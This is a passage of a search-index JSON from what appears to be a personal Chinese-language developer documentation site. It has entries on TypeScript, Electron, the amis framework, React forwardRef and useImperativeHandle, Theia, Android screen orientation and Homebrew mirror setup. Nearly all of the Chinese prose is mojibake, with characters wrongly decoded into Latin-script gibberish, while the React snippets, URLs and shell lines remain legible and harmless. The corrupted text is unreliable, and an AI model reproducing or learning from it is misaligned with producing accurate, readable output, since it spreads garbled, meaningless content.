çš„è¶…é›†ï¼Œæ‰©å±•äº† JavaScript çš„è¯­æ³•ï¼Œ å› æ­¤ç°æœ‰çš„ JavaScript ä»£ç å¯ä¸ TypeScript ä¸€èµ·å·¥ä½œæ— éœ€ä»»ä½•ä¿®æ”¹ï¼ŒTypeScript é€šè¿‡ç±»å‹æ³¨è§£æä¾›ç¼–è¯‘æ—¶çš„é™æ€ç±»å‹æ£€æŸ¥ã€‚ TypeScript å¯å¤„ç†å·²æœ‰çš„ JavaScript ä»£ç ï¼Œå¹¶åªå¯¹å…¶ä¸­çš„ TypeScript ä»£ç è¿›è¡Œç¼–è¯‘ã€‚ æ‰§è¡Œæ–¹å¼: æ–¹æ³•1: å…ˆç”¨ tsc ç¼–è¯‘ä¸ºjs, ç„¶åæ‰§è¡Œ æ–¹æ³•2: ä½¿ç”¨ ts-node ç›´æ¥æ‰§è¡Œtsæ–‡ä»¶(éœ€è¦å®‰è£…typescript ts-node @types/node tslibåº“) è¯­æ³• åŸºç¡€è¯­æ³• åŸºç¡€ç±»å‹ å‡½æ•° é—®å·ä¸å¹å· tsæºç è°ƒè¯• ç›¸å…³æŒ‡ä»¤ tsc æ¡ä»¶è¯­å¥ if [else [if ...]] switch...case å¾ªç¯ æ™®é€šçš„for, eg: for ( init; condition; increment ){ statement(s); } for...inè¯­å¥: for (var val in list) { //è¯­å¥ } å…¶ä»–å¦‚forâ€¦of ã€every å’Œ some å¾ªç¯ whileè¯­å¥: while(condition) { statement(s); } do...while: do { statement(s); }while( condition ); è¯·æ³¨æ„ï¼Œæ¡ä»¶è¡¨è¾¾å¼å‡ºç°åœ¨å¾ªç¯çš„å°¾éƒ¨ï¼Œæ‰€ä»¥å¾ªç¯ä¸­çš„ statement(s) ä¼šåœ¨æ¡ä»¶è¢«æµ‹è¯•ä¹‹å‰è‡³å°‘æ‰§è¡Œä¸€æ¬¡ å‘½ä»¤ç©ºé—´ä½¿ç”¨ å‘½åç©ºé—´çš„åç§°å¯ä»¥ä¸ç±»åä¸€è‡´, ä½†æ˜¯ å¦‚æœç±»æ˜¯ export, å‘½åç©ºé—´ä¹Ÿè¦ export ç±»è¦å…ˆå‘½åç©ºé—´å£°æ˜","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-TypeScript-index.html","loc":"/yq-doc-source-docs-front-end-TypeScript-index.html"},{"title":"Electron","text":"ä¸­æ–‡å®˜æ–¹æ–‡æ¡£: Electron 28.0.0 æœ€æ–°æ–‡æ¡£åœ°å€: https://www.electronjs.org/zh/docs/latest/ installæŠ¥é”™ electron-builderé…ç½®ç”Ÿæˆä½ç½® electronç”Ÿå‘½å‘¨æœŸ ä¸€äº›é—®é¢˜ webstromä¸­å¦‚ä½•è¿›è¡Œè°ƒè¯•","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-Electron-index.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-index.html"},{"title":"ä½ä»£ç æ¡†æ¶amis","text":"ä½ä»£ç æ¡†æ¶æ—¨åœ¨ä»…ç”¨æå°‘çš„é…ç½®ä¿¡æ¯æ¥è¡¨è¿°ä¸€ä¸ªé¡µé¢ å…³äºamis, ä¸ªäººè§‰å¾—, æœ€å¥½çš„é€‚ç”¨æƒ…å†µæ˜¯: å·²ç»æœ‰å®Œå¤‡çš„åç«¯api, åªéœ€è¦ç®€å•çš„è§„åˆ’å‰ç«¯JSONå³å¯ åƒä¸Reactç»“åˆè¿™ç§, ä¸ªäººä¸å»ºè®®ä½¿ç”¨JSONçš„å½¢å¼, å› ä¸ºæœ‰ä¸€äº›äº¤äº’æ˜¯éœ€è¦ä»£ç å®ä¾‹å˜é‡ä»‹å…¥çš„, å®åœ¨è¦ä»‹å…¥, è¦ä¹ˆReactç±»å˜é‡ç­‰ä¸å‚ä¸JSONçš„æ•°æ®æµè½¬, è¦ä¹ˆ, æ„Ÿè§‰ç›´æ¥ä½¿ç”¨amisæä¾›å¥½çš„ç»„ä»¶ä»¥JSXçš„å½¢å¼ä½¿ç”¨. å½“ç„¶, ä¸ªäººè§‚ç‚¹. amis apié…ç½® è¡¨è¾¾å¼è¯­æ³• æ”¯æŒçš„actonType è¡¨å•æ ¡éªŒ é—®é¢˜ ç—›ç‚¹-æ•°æ®åŸŸçš„æ›´æ–° å½“å­å±‚æ›´æ–°æ•°æ®åŸŸå,ä¸Šå±‚ä¸ä¼šæ”¶åˆ°æ›´æ–°(æ•°æ®åŸŸå‘ä¸Šæ›´æ–°); å½“æŸæ¬¡æ›´æ–°æ•°æ®åŸŸå, ä¸‹æ¬¡æ‰“å¼€è¿˜æ˜¯æ—§çš„(å½“å‰æ•°æ®åŸŸæ•°æ®ä¿å­˜); å¿…é¡»é€šè¿‡apiæ¥æ›´æ–°, å‘ç‚¹... è¯·æ±‚é€‚é…å™¨ å¯ç”¨äºå¯¹è¯·æ±‚æ•°æ®çš„è¿‡æ»¤ç­‰æ“ä½œ, è§: https://aisuda.bce.baidu.com/amis/zh-CN/docs/types/api#é…ç½®è¯·æ±‚é€‚é…å™¨ ç»„ä»¶çš„ç®€å•è‡ªå®šä¹‰ å®˜æ–¹åŸæ–‡è§: https://aisuda.bce.baidu.com/amis/zh-CN/docs/extend/custom-react ä¾‹å­: { // type: 'custom-kv-text', name: 'envDD', label: 'label-d', mode: \"horizontal\", asFormItem: true, children: ({value, onChange, data}: any) => ( <React.Fragment> <p>è¿™ä¸ªæ˜¯ä¸ªè‡ªå®šä¹‰ç»„ä»¶</p> {/*<p>å½“å‰å€¼ï¼š{value}</p>*/} <input type='text' value={typeof value === 'object' ? JSON.stringify(value) : value} onChange={(e) => { let curData = e.target.value try { curData = JSON.parse(curData) data.envData = curData } catch (err) { console.log('not json schema') // return } onChange(curData) }} /> </React.Fragment> ) },","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-index.html","loc":"/yq-doc-source-docs-front-end-frame-amis-index.html"},{"title":"é—®é¢˜æ€»ç»“","text":"Reactä½¿ç”¨ æ¸²æŸ“ç•Œé¢æ— æ ·å¼ è°ƒç”¨æœ¬åœ°è‡ªå®šä¹‰å‡½æ•° ä¸Reactç»“åˆä½¿ç”¨çš„æ•°æ®æ›´æ–° validationséªŒè¯ä¿¡æ¯é…ç½®æ— æ•ˆ æ•°æ®åŸŸçš„å‘ä¸Šæ›´æ–° dialogæ›´æ–°çˆ¶ç»„ä»¶æ•°æ®åŸŸ input-textè¯´æ˜ input-kvè¯´æ˜ input-arrayä½¿ç”¨ è°ƒç”¨å…¶ä»–ç»„ä»¶ comboæ— æ³•æŒ‡å®šæ›´æ–°æŸä¸€ä¸ª componentNameæ— æ•ˆ å˜é‡ä½¿ç”¨ ç±»disabledå±æ€§åªèƒ½è¯†åˆ«æ•°æ®é“¾å¯¹è±¡ è®¾ç½®å…¶ä»–ç»„ä»¶çš„å€¼ disabledOn è¡¨è¾¾å¼å¦‚æœåŒ…å«æœ‰ æ¨ªæ  - æ—¶ä¼šæ— æ•ˆ","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-index.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-index.html"},{"title":"å‰ç«¯æ¡†æ¶","text":"amis electron react theia jQuery","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-index.html","loc":"/yq-doc-source-docs-front-end-frame-index.html"},{"title":"React API","text":"Component","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-API-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-API-index.html"},{"title":"forwardRef","text":"å®˜ç½‘: https://zh-hans.react.dev/reference/react/forwardRef React.forwardRef ä¼šåˆ›å»ºä¸€ä¸ªReactç»„ä»¶ï¼Œè¿™ä¸ªç»„ä»¶èƒ½å¤Ÿå°†å…¶æ¥å—çš„ ref å±æ€§è½¬å‘åˆ°å…¶ç»„ä»¶æ ‘ä¸‹çš„å¦ä¸€ä¸ªç»„ä»¶ä¸­ã€‚ è¿™ç§æŠ€æœ¯å¹¶ä¸å¸¸è§ï¼Œä½†åœ¨ä»¥ä¸‹ä¸¤ç§åœºæ™¯ä¸­ç‰¹åˆ«æœ‰ç”¨ï¼š è½¬å‘ refs åˆ° DOM ç»„ä»¶ åœ¨é«˜é˜¶ç»„ä»¶ä¸­è½¬å‘ refs è½¬å‘ DOM ç»„ä»¶(å†…ç½®ç»„ä»¶èŠ‚ç‚¹) ä¸€èˆ¬æƒ…å†µä¸‹, refä¸èƒ½æŒ‚åˆ°ä¸€ä¸ªå‡½æ•°å¼ç»„ä»¶ , ä½¿ç”¨ fowardRef å°±å¯ä»¥æ”¯æŒ: const App: React.FC = () => { const ref = useRef(null); useEffect(() => { ref.current.focus(); }, []); return ( <> <Child ref={ref} /> </> ); }; const Child = forwardRef((props, ref: Ref<any>) => { return <input type=\"text\" name=\"child\" ref={ref} />; }); æ³¨è§£ React.forwardRefå‚æ•°å¿…é¡»æ˜¯functionï¼Œè€Œè¿™ä¸ªAPIé€šå¸¸ç”¨æ¥è§£å†³HOCï¼ˆé«˜é˜¶ç»„ä»¶ï¼‰ä¸­ä¸¢å¤±refçš„é—®é¢˜ã€‚ useImperativeHandle è§: /docs/å‰ç«¯/æ¡†æ¶/react/hooks/useImperativeHandle å‚è€ƒ: useRefã€createRefçš„åŒºåˆ«åŠä½¿ç”¨ï¼ŒåŠuseRefå¦™ç”¨ reactä¸­refã€createRefã€useRefã€forwardRefä»¥åŠuseImperativeHandle","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-hooks-Forwardref.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-Forwardref.html"},{"title":"hooks","text":"é’©å­å‡½æ•°? ä¸»è¦æ˜¯ä¸ºäº†çŠ¶æ€é€»è¾‘çš„å¤ç”¨ æœ€å¸¸è§çš„å†…ç½®ä¸¤ç§ useState useEffect æ³¨è§£ è²Œä¼¼ä¸¥æ ¼æ¥è¯´, åªæœ‰å‡½æ•°æ‰ç®—Hooks å‡½æ•°ç»„ä»¶æ‹¥æœ‰ useState useEffect useRef forwardRef useImperativeHandle ç±»ç»„ä»¶ç‰¹æœ‰ createRef å…¶ä»– è‡ªå®šä¹‰Hook Hook çš„è§„åˆ™ åªåœ¨æœ€é¡¶å±‚ä½¿ç”¨Hook: ä¹Ÿå°±æ˜¯ä¸è¦åœ¨å¾ªç¯ã€æ¡ä»¶æˆ–åµŒå¥—å‡½æ•°ä¸­è°ƒç”¨Hookï¼Œè¿™æ ·å¯ä»¥åšåˆ°å„ä¸ªhook åœ¨æ¯ä¸€æ¬¡æ¸²æŸ“ä¸­ï¼Œè°ƒç”¨çš„é¡ºåºæ˜¯ä¸€è‡´çš„. é‚£ä¸ºä»€ä¹ˆè¦ä¿è¯ hook è°ƒç”¨é¡ºåº? å’ŒReactå®ç°hookçš„åŸç†æœ‰å…³, æ¯æ¬¡æ¸²æŸ“æ—¶ï¼ŒReactæŠŠæ‰€æœ‰è°ƒç”¨çš„ hook ç”¨æ•°ç»„æ¥å‚¨å­˜. åªåœ¨Reactç»„ä»¶ä¸­æ‰èƒ½è°ƒç”¨:","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-hooks-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-index.html"},{"title":"useImperativeHandle","text":"useImperativeHandle å¯ä»¥è®©ä½ åœ¨ä½¿ç”¨ ref æ—¶ è‡ªå®šä¹‰æš´éœ²ç»™çˆ¶ç»„ä»¶çš„å®ä¾‹å€¼ ã€‚ æˆ–è€… ç»™ä¸å­˜åœ¨refå±æ€§çš„å‡½æ•°ç»„ä»¶, å¢åŠ refå±æ€§ . åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåº”å½“é¿å…ä½¿ç”¨ ref è¿™æ ·çš„å‘½ä»¤å¼ä»£ç ã€‚ useImperativeHandle åº”å½“ä¸ /docs/å‰ç«¯/æ¡†æ¶/react/hooks/forwardRef ä¸€èµ·ä½¿ç”¨ æš´éœ²DOMèŠ‚ç‚¹æ—¶è‡ªå®šä¹‰æš´éœ²å±æ€§ useImperativeHandle åº”å½“ä¸ forwardRef ä¸€èµ·ä½¿ç”¨, è°ƒç”¨æ–¹å¼: useImperativeHandle(ref, createHandle, [deps]) æ¥æ”¶ä¸€ä¸ªref æ¥æ”¶ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è¿”å›çš„å¯¹è±¡å³æ˜¯è¦æš´éœ²å‡ºçš„ref ç±»ä¼¼useEffectï¼Œæ¥æ”¶ä¸€ä¸ªä¾èµ–æ•°ç»„ ä¾‹å­: const FancyInput=(props, ref) =>{ const inputRef = useRef(); useImperativeHandle(ref, () => ({ focus: () => { inputRef.current.focus(); } })); return <input ref={inputRef} />; } export default forwardRef(FancyInput); æ¸²æŸ“: <FancyInput ref={fancyInputRef} /> çš„çˆ¶ç»„ä»¶å¯ä»¥è°ƒç”¨: fancyInputRef.current.focus() ç»™éDOMå‡½æ•°ç»„ä»¶å¢åŠ refå±æ€§ ä¸ æš´éœ²DOMèŠ‚ç‚¹æ—¶è‡ªå®šä¹‰æš´éœ²å±æ€§ ä¾‹å­åŸºæœ¬ä¸€è‡´ æ³¨è§£ å‡½æ•°ç»„ä»¶é»˜è®¤æ²¡æœ‰refå±æ€§. ä»…DOMèŠ‚ç‚¹(åŸç”Ÿæä¾›çš„HTMLèŠ‚ç‚¹)æœ‰ ä¸è¿‡ä¸Šé¢è¿˜æ˜¯ç”¨äº†DOMèŠ‚ç‚¹ref, å¯èƒ½åˆå­¦æ—¶å­˜åœ¨æ··æ·†, åŠ ä¸ªè‡ªå®šä¹‰å‡½æ•°ç»„ä»¶ä½œä¸ºä¾‹å­: const PSelect00 = (props: any) => { return ( <div>p00</div> ) } // è°ƒç”¨å­ç»„ä»¶ const PSelect0 = React.forwardRef((props, ref) => { // å®šä¹‰æš´éœ²çš„ ref React.useImperativeHandle(ref, () => ({ do1: do1 })) const do1 = () => {console.log(1)} return ( <PSelect00>p0</PSelect00> ) }) // çˆ¶ç»„ä»¶ const PSelect1 = () => { const refP0 = React.useRef() return <PSelect0 ref={refP0}/> } è­¦å‘Š å½“ forwardRef å†…å®¹æ²¡æœ‰è½¬å‘ DOM èŠ‚ç‚¹æ—¶, æ¯”å¦‚æ­¤å¤„çš„: return ( <PSelect00>p0</PSelect00> ) å¿…é¡»ä½¿ç”¨ useImperativeHandle æ¥æ¥æ”¶ä¼ å…¥çš„ ref, å¦åˆ™ ref ä¸º null. æ¯”å¦‚æ­¤å¤„çš„: // å®šä¹‰æš´éœ²çš„ ref React.useImperativeHandle(ref, () => ({ do1: do1 })) æ˜¾è€Œæ˜“è§å˜›, forwardæœ¬æ¥å°±æ˜¯è½¬å‘refçš„, ä½ éƒ½ä¸è½¬å‘äº†, å†ä¸å£°æ˜useImperativeHandle, ä¸å°±æ˜¯null. é‚£ä½ å¯èƒ½ä¼šé—®, å¦‚æœä¸¤ä¸ªéƒ½å®šä¹‰äº†refå‘¢? é‚£å°±æ˜¯åœ¨æš´éœ²DOMç»„ä»¶çš„åŸºç¡€ä¸Š, å†æ§åˆ¶éœ€è¦æš´éœ²çš„å†…å®¹.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-hooks-useImperativeHandle.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-useImperativeHandle.html"},{"title":"æŠ€æœ¯å®ç°","text":"å¤šä¸»é¢˜ ç¼–è¾‘å™¨æ‰“å¼€å¹¶æ»‘åŠ¨ èµ„æºç®¡ç†å™¨å·¥ä½œåŒºæŒ‰é’® å·¥å…·æ æ›´å¤š theiaæºç -user-storage å…³äºvscodeçš„è¯­è¨€æœåŠ¡å™¨","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-index.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-index.html"},{"title":"Theia","text":"ä¸€ä¸ªIDEæ¡†æ¶, å‰åç«¯åˆ†ç¦»çš„æ¶æ„ ä»¥æ’ä»¶çš„å½¢å¼ç¼–å†™ä»£ç , æ”¯æŒä¾èµ–æ³¨å…¥ åç«¯å¯é€‰æµè§ˆå™¨/Electron æ³¨æ„ä½¿ç”¨ rawProcessFactory åˆ›å»ºçš„è¿›ç¨‹å¯èƒ½å— ProcessManagerçš„æ§åˆ¶, ä¼šåœ¨å…³é—­æ—¶å€™è‡ªåŠ¨å…³é—­æ‰€æœ‰ç”±å…¶åˆ›å»ºçš„å­è¿›ç¨‹ åˆ›å»ºè‡ªå·±çš„IDE æŠ€æœ¯å®ç° é—®é¢˜ æ³¨è§£ æ­¤ç¯‡å¹…æ‰€æœ‰å†…å®¹, åŸºäºTheiaå½“å‰ç‰ˆæœ¬: % yarn list --pattern=@theia/core yarn list v1.22.17 â””â”€ @theia/core@1.42.1 âœ¨ Done in 1.06s. ä¸€äº›æ›´æ–° è·Ÿéštheiaçš„æ›´æ–°, theia-1.43.1 æ­¤ç‰ˆæœ¬ä¸­æ–‡ç¿»è¯‘æœ‰é—®é¢˜, \"File\" ä¼šè¢«ç¿»è¯‘ä¸ºæœ¬åœ°çœ‹è§, ç ”ç©¶ä»£ç å åœ¨githubæå‡º: https://github.com/eclipse-theia/theia/pull/13028 ä½œè€…æœ‰è·Ÿè¿› æ’ä»¶å¸‚åœº åœ°å€: https://open-vsx.org ä¸€äº›å¸¸ç”¨æ’ä»¶: ä¸­æ–‡æ”¯æŒ: https://open-vsx.org/extension/ms-ceintl/vscode-language-pack-zh-hans","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-index.html","loc":"/yq-doc-source-docs-front-end-frame-theia-index.html"},{"title":"Theiaæ¡†æ¶ç›¸å…³é—®é¢˜æ€»ç»“","text":"å…³äºtheiaçš„ç»‘å®š åˆ›å»ºè‡ªå®šä¹‰æ‹“å±• æ‰“å¼€-åˆ‡æ¢ç¼–è¾‘å™¨ å¼•å…¥è‡ªå®šä¹‰cssæ–‡ä»¶ ç»„ä»¶çš„çŠ¶æ€æ¸²æŸ“ å®Œå…¨å…³é—­Theiaåº”ç”¨ å–æ¶ˆå¼‚æ­¥æ“ä½œ ä¾èµ–æ³¨å…¥ä½¿ç”¨ä»¥åŠé—®é¢˜ åœ¨theiaçš„dialogä¸Šæ–°å¢è‡ªå®šä¹‰dialog è‡ªå®šä¹‰ä»»æ„ä½ç½®çš„é¼ æ ‡å³é”®ä¸Šä¸‹æ–‡èœå• ä½¿ç”¨diffç¼–è¾‘å™¨æ‰“å¼€ä¸¤ä¸ªæ–‡ä»¶å¯¹æ¯” ç»“åˆelectronæ—¶å€™çš„æŠ¥é”™ å‰åç«¯é€šä¿¡-å‰ç«¯è°ƒç”¨åç«¯æœåŠ¡ æ§ä»¶çŠ¶æ€ä¿å­˜ä¸æ¢å¤ å‰åç«¯è·¯å¾„ä¼ é€’URI ä½¿ç”¨å¤–éƒ¨æµè§ˆå™¨æ‰“å¼€é“¾æ¥ theiaå¯åŠ¨ç™½å± å†…ç½®ä¸€äº›å¤–éƒ¨æ’ä»¶ æ‰“å¼€ç›®å½•&æ–‡ä»¶é€‰æ‹©å™¨ yarn install å‡ºç°node-gypæŠ¥é”™","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-index.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-index.html"},{"title":"æ ‡å‡†åº“","text":"./child_process","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Standard-library-index.html","loc":"/yq-doc-source-docs-front-end-node-Standard-library-index.html"},{"title":"nodeæœåŠ¡ç«¯","text":"nodeç›¸å…³ ./nodeä¸‹è½½å®‰è£… ./nodeå¯åŠ¨å¸¸è§å‚æ•° å†…ç½®å¯¹è±¡ nodeæ ‡å‡†åº“ ./æ ‡å‡†åº“ nodeä¸‰æ–¹åº“ ./ä¸‰æ–¹åº“ å†…ç½®å˜é‡ process ç§ä»¥ä¸ºå°±æ˜¯æŒ‡å½“å‰nodeè¿›ç¨‹æœ¬èº«, å¯ç”¨æ¥åšå¾ˆå¤šäº‹æƒ…, æ¯”å¦‚æŸ¥çœ‹å½“å‰åŒ…å«æ‰€æœ‰ä¸œè¥¿çš„ç‰ˆæœ¬: process.versions","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-index.html","loc":"/yq-doc-source-docs-front-end-node-index.html"},{"title":"é—®é¢˜","text":"åŒ…ç®¡ç†å™¨-å¸¸è§æŠ¥é”™ ç®­å¤´å‡½æ•°thisæŒ‡å‘é—®é¢˜ æµè§ˆå™¨ç¼“å­˜æ¸…ç† å‰ç«¯-å‡½æ•°è°ƒç”¨ä¸ç»„ä»¶è°ƒç”¨ è‡ªå®šä¹‰æ ·å¼çš„Checkbox electron+react+ts htmlä¸‹urlç¼–ç  importä¸require jsxæˆ–tsxçš„èŠ±æ‹¬å· ObjectåŸå‹æ–¹æ³• package.jsonå¢åŠ æœ¬åœ°æ¨¡å— vscodeé¡¹ç›®çš„ç¼–è¯‘è¿è¡Œ CSSæ’é™¤æŒ‡å®šçš„é€‰æ‹©å™¨ tsçš„æ„Ÿå¹å·ä¸é—®å· å¯¼å…¥json é—®é¢˜æ€»ç»“","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-index.html","loc":"/yq-doc-source-docs-front-end-question-index.html"},{"title":"ä¸€äº›UIç›¸å…³çš„äº†è§£","text":"16è¿›åˆ¶é¢œè‰² å¦‚: #00FF00FF ä»¥ # å¼€å¤´, åç»­ä»¥æ¯ä¸¤ä¸ªä»¥ä¸ºä¸€ä¸ªéƒ¨åˆ† ç¬¬ä¸€ä¸ª, è¡¨ç¤ºé€æ˜åº¦, è¿™é‡Œæ˜¯ 00 (é€æ˜åº¦ä¸º0) ç¬¬äºŒä¸ª, è¡¨ç¤ºçº¢è‰², è¿™é‡Œæ˜¯ FF (æ·±çº¢) ç¬¬äºŒä¸ª, è¡¨ç¤ºé»„è‰², è¿™é‡Œæ˜¯ 00 (æµ…é»„) ç¬¬äºŒä¸ª, è¡¨ç¤ºè“è‰², è¿™é‡Œæ˜¯ FF (æ·±è“) æƒ³è¦ä»€ä¹ˆé¢œè‰²å°±æ˜¯è°ƒæ•´è¿™äº›éƒ¨åˆ†çš„å€¼æ¥è°ƒè‰² ä¸ºä»€ä¹ˆç”¨ä¸¤ä½ å› ä¸ºåœ¨åè¿›åˆ¶ä¸­é¢œè‰²çš„æ•°å€¼èŒƒå›´ä¸º 0 ~ 255 , å¦‚æœåªç”¨ä¸€ä½ 0 ~ F , å¯¹åº”çš„èŒƒå›´ä¸º 0 ~ 15","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Android-Some-UI-related-understanding.html","loc":"/yq-doc-source-docs-operating-system-Android-Some-UI-related-understanding.html"},{"title":"ä¸€äº›XMLé…ç½®å±æ€§","text":"screenOrientation Androidåº”ç”¨ç¨‹åºä¸­ï¼Œ android:screenOrientation ç”¨äº æ§åˆ¶activityå¯åŠ¨æ—¶æ–¹å‘ ï¼Œä¹Ÿå°±æ˜¯æ¨ªç«–å±å±•ç¤ºã€‚ ä¸‹é¢åˆ—å‡ºå¸¸ç”¨çš„å±æ€§å€¼ï¼š unspecifiedï¼Œé»˜è®¤å€¼ï¼Œç”±ç³»ç»Ÿå†³å®šï¼Œä¸åŒæ‰‹æœºå¯èƒ½ä¸ä¸€è‡´ landscapeï¼Œå¼ºåˆ¶æ¨ªå±æ˜¾ç¤º portraitï¼Œå¼ºåˆ¶ç«–å±æ˜¾ç¤º behindï¼Œä¸å‰ä¸€ä¸ªactivityæ–¹å‘ç›¸åŒ sensorï¼Œæ ¹æ®ç‰©ç†ä¼ æ„Ÿå™¨æ–¹å‘è½¬åŠ¨ï¼Œç”¨æˆ·90åº¦ã€180åº¦ã€270åº¦æ—‹è½¬æ‰‹æœºæ–¹å‘ï¼Œactivityéƒ½æ›´ç€å˜åŒ– sensorLandscapeï¼Œæ¨ªå±æ—‹è½¬ï¼Œä¸€èˆ¬æ¨ªå±æ¸¸æˆä¼šè¿™æ ·è®¾ç½® sensorPortraitï¼Œç«–å±æ—‹è½¬ nosensorï¼Œæ—‹è½¬è®¾å¤‡æ—¶å€™ï¼Œç•Œé¢ä¸ä¼šè·Ÿç€æ—‹è½¬ã€‚åˆå§‹åŒ–ç•Œé¢æ–¹å‘ç”±ç³»ç»Ÿæ§åˆ¶ userï¼Œç”¨æˆ·å½“å‰è®¾ç½®çš„æ–¹å‘ fullSensor æ˜¾ç¤ºçš„æ–¹å‘ï¼ˆ4ä¸ªæ–¹å‘ï¼‰æ˜¯ç”±è®¾å¤‡çš„æ–¹å‘ä¼ æ„Ÿå™¨æ¥å†³å®šçš„ï¼Œ é™¤äº†å®ƒå…è®¸å±å¹•æœ‰4ä¸ªæ˜¾ç¤ºæ–¹å‘ä¹‹å¤–ï¼Œå…¶ä»–ä¸è®¾ç½®ä¸º\"sensor\"æ—¶æƒ…å†µç±»ä¼¼ï¼Œ ä¸ç®¡ä»€ä¹ˆæ ·çš„è®¾å¤‡ï¼Œé€šå¸¸éƒ½ä¼šè¿™ä¹ˆåšã€‚ ä¾‹å¦‚ï¼ŒæŸäº›è®¾å¤‡é€šå¸¸ä¸ä½¿ç”¨çºµå‘å€’è½¬æˆ–æ¨ªå‘åè½¬ï¼Œä½†æ˜¯ä½¿ç”¨è¿™ä¸ªè®¾ç½®ï¼Œ è¿˜æ˜¯ä¼šå‘ç”Ÿè¿™æ ·çš„åè½¬ã€‚è¿™ä¸ªå€¼åœ¨API Level 9ä¸­å¼•å…¥ fulluser å¦‚æœç”¨æˆ·é”å®šäº†åŸºäºä¼ æ„Ÿå™¨çš„æ—‹è½¬ï¼Œå…¶è¡Œä¸ºä¸ user ç›¸åŒï¼Œ å¦åˆ™ï¼Œå…¶è¡Œä¸ºä¸ fullSensor ç›¸åŒï¼Œå…è®¸æ‰€æœ‰4ç§å¯èƒ½çš„å±å¹•æ–¹ å‘ã€‚APIçº§åˆ« 18ä¸­çš„æ–°å¢é…ç½®ã€‚ locked å°†æ–¹å‘é”å®šåœ¨å…¶å½“å‰çš„ä»»æ„æ—‹è½¬æ–¹å‘ã€‚APIçº§åˆ« 18 ä¸­çš„æ–°å¢é…ç½®ã€‚ å‚è€ƒ: https://blog.csdn.net/lixiaoliang0723/article/details/105220692","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Android-Some-XML-configuration-attributes.html","loc":"/yq-doc-source-docs-operating-system-Android-Some-XML-configuration-attributes.html"},{"title":"å®‰å“ç›¸å…³","text":"é•œåƒæ–‡ä»¶è§£åŒ… ä¸€äº›UIç›¸å…³çš„äº†è§£ ä¸€äº›XMLé…ç½®å±æ€§","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Android-index.html","loc":"/yq-doc-source-docs-operating-system-Android-index.html"},{"title":"Macä¸“æœ‰æŒ‡ä»¤","text":"codesign convert gs launchctl otool security sips xcrun","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-index.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-index.html"},{"title":"Macç¯å¢ƒå˜é‡","text":"DYLD_INSERT_LIBRARIES DYLD_PRINT_LIBRARIES","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-index.html","loc":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-index.html"},{"title":"Mac","text":"MacæŒ‡ä»¤ Macç¯å¢ƒå˜é‡ æ‰“å°è¿è¡Œæ—¶åŠ è½½çš„åŠ¨æ€åº“ å›¾æ ‡åˆ¶ä½œ Mac-Vmwareç£ç›˜ä¿®å¤ é—®é¢˜ brew åŒ…ç®¡ç†å™¨brew (HomeBrew) æŸ¥çœ‹é…ç½®: brew config è¾“å‡º: $ brew config HOMEBREW_VERSION: 4.1.24 ORIGIN: https://github.com/Homebrew/brew ... æ›´æ¢é•œåƒ(å¿½ç•¥): # æ›¿æ¢ brew.git cd \"$(brew --repo)\" git remote set-url origin https://mirrors.ustc.edu.cn/brew.git # æ›¿æ¢ homebrew-core.git # cd \"$(brew --repo)/Library/Taps/homebrew/homebrew-core\" # git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git # æ–°ç‰ˆæ²¡æœ‰è¿™ç›®å½• å‚è€ƒ: https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ è®¾ç½®ç¯å¢ƒå˜é‡: export HOMEBREW_API_DOMAIN=\"https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles/api\" export HOMEBREW_BOTTLE_DOMAIN=\"https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\" export HOMEBREW_BREW_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git\" export HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\" export HOMEBREW_PIP_INDEX_URL=\"https://pypi.tuna.tsinghua.edu.cn/simple\" é’ˆå¯¹ macOS ç³»ç»Ÿä¸Šçš„ Homebrew: # æ‰‹åŠ¨è®¾ç½® export HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\" # æ³¨ï¼šè‡ª brew 4.0 èµ·ï¼Œå¤§éƒ¨åˆ† Homebrew ç”¨æˆ·æ— éœ€è®¾ç½® homebrew/core å’Œ homebrew/cask é•œåƒï¼Œåªéœ€è®¾ç½® 